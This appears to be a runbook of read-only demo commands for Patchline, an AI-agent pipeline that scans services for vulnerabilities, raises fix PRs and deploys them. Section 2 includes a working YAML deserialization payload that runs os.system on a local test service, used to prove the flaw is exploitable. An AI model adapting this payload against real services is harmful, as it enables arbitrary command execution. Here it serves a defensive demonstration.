# Patchline demo commands

Read-only commands to show what the pipeline is doing, for a live walkthrough.

**Run everything from the repo root:**

```bash
cd ~/Documents/GitHub/patchline
```

If a command says `no such file or directory`, your shell isn't in the repo — check your prompt reads `… patchline %`, not `… ~ %`. Every command below has a `scripts/demo-peek.sh` shortcut that finds the repo on its own, so those work from anywhere.

---

## 0. Pre-flight (before the call)

```bash
podman machine list            # VM must be Running
podman ps                      # forge, telemetry-ingest, supplier-portal all Up
curl -s localhost:4100/api/repos   # orchestrator alive -> ["supplier-portal","telemetry-ingest"]
```

Open the dashboard: **http://localhost:4100**

Start the orchestrator if it isn't running:

```bash
cd ~/Documents/GitHub/patchline/orchestrator && npm start
```

---

## 1. The setup (before you click Run fleet)

**The policy that decides auto-merge vs human approval:**

```bash
cat demo/services/*/.patchline/policy.json
```

**The vulnerabilities are real — run the scanner yourself:**

```bash
trivy fs --scanners vuln --quiet --severity CRITICAL,HIGH demo/services/telemetry-ingest
```

**Just the CVE + installed → fixed, one per line:**

```bash
scripts/demo-peek.sh scan-json
```

**The two running services, before any patch:**

```bash
scripts/demo-peek.sh health
curl -s "localhost:8082/parts?q=valve" | jq
```

**Send a real mission profile through the telemetry service** (shows the `!vector` tag working — the thing the fix must not break):

```bash
curl -s -X POST localhost:8081/profiles --data-binary @- <<'EOF'
mission: CRS-41
vehicle: F9-B1092
waypoints:
  - name: MECO
    position: !vector [6471000, 0, 0]
  - name: SECO
    position: !vector [6571000, 1200, -40]
EOF
```

```bash
curl -s localhost:8081/profiles/CRS-41/report    # renders the parsed vectors
```

---

## 2. Prove the vulnerability is exploitable (optional, punchy)

Only ever against your own local `:8081`. Benign — writes a marker file, runs nothing harmful.

```bash
podman exec telemetry-ingest rm -f /tmp/PWNED
curl -s -X POST localhost:8081/profiles --data-binary $'!!python/object/new:tuple\n- !!python/object/new:map\n  - !!python/name:eval\n  - ["__import__(\'os\').system(\'echo pwned-$(date -u +%H:%M:%S) > /tmp/PWNED\')"]\n'
```

The server replies `{"error":"profile must be a mapping"}` — looks rejected. But the code already ran:

```bash
podman exec telemetry-ingest cat /tmp/PWNED      # prints your pwned-… line
```

After the fix deploys, the same payload writes no file. Clean up:

```bash
podman exec telemetry-ingest rm -f /tmp/PWNED
```

---

## 3. Watch the pipeline run (open these in side panes, then click Run fleet)

Each is a live tail. `Ctrl-C` to stop. Start them **just before** Run fleet — they show new events only.

**Stage transitions (scan → triage → … → deploy):**

```bash
scripts/demo-peek.sh stages
```

**Which model did what, and how long it took** (makes the Composer/Grok split visible):

```bash
scripts/demo-peek.sh agents
```

**Readiness checks flipping as they're measured:**

```bash
scripts/demo-peek.sh checks
```

**Gate decisions and their reasons:**

```bash
scripts/demo-peek.sh gate
```

**Raw orchestrator log (agents, tool calls, everything):**

```bash
scripts/demo-peek.sh log
```

Trigger a run from the terminal instead of the button:

```bash
curl -s -X POST localhost:4100/api/remediate            # whole fleet
curl -s -X POST localhost:4100/api/remediate -H 'content-type: application/json' -d '{"repo":"telemetry-ingest"}'
```

---

## 4. The output (after a run)

**Open PRs Patchline raised:**

```bash
scripts/demo-peek.sh prs
```

**Running images — the tag flips from `baseline-…` to a git SHA after a deploy** (nobody touched the cluster; a commit changed what's running):

```bash
scripts/demo-peek.sh containers
```

**The incident timeline for a repo** (opened first, closed only on a healthy deploy):

```bash
source .env
curl -s -H "Authorization: token $FORGE_TOKEN" \
  "$FORGE_URL/api/v1/repos/$FORGE_ORG/supplier-portal/issues?state=all" \
  | jq -r '.[] | "#\(.number) [\(.state)] \(.title)"'
```

**Approve a HIGH-risk PR as the human reviewer** (telemetry-ingest waits for this). Check the PR number first with `scripts/demo-peek.sh prs`, then merge it (replace `1`):

```bash
source .env
curl -s -X POST -H "Authorization: token $FORGE_TOKEN" -H 'content-type: application/json' \
  -d '{"Do":"squash"}' \
  "$FORGE_URL/api/v1/repos/$FORGE_ORG/telemetry-ingest/pulls/1/merge"
```

Or just click **Merge** in the Gitea UI at `http://localhost:3000` — that's the more natural demo move.

The merge webhook then triggers the Ansible deploy automatically. Watch it in the `stages` pane.

---

## 5. The code (repo walk)

**Where the Cursor SDK starts:**

```bash
sed -n '1,45p' orchestrator/src/agents.ts
```

**The gate — a plain decision table, no model in it:**

```bash
cat orchestrator/src/gate.ts
```

**The tests behind the gate:**

```bash
cd orchestrator && npm test; cd ..
```

---

## 6. Reset for another run

```bash
cd orchestrator && npm run seed -- --reset && cd ..    # repos back to vulnerable baseline, 0 PRs
rm -f .patchline-work/ledger.jsonl                      # clear the dashboard (restart the server after)
podman restart telemetry-ingest supplier-portal         # clear in-memory service state
```

---

## Fallback if live agents misbehave

Replays a recorded end-to-end run into the dashboard with no agents and no network:

```bash
cd orchestrator && node scripts/replay-demo.ts --live 4
```

---

## Menu of every shortcut

```bash
scripts/demo-peek.sh
```
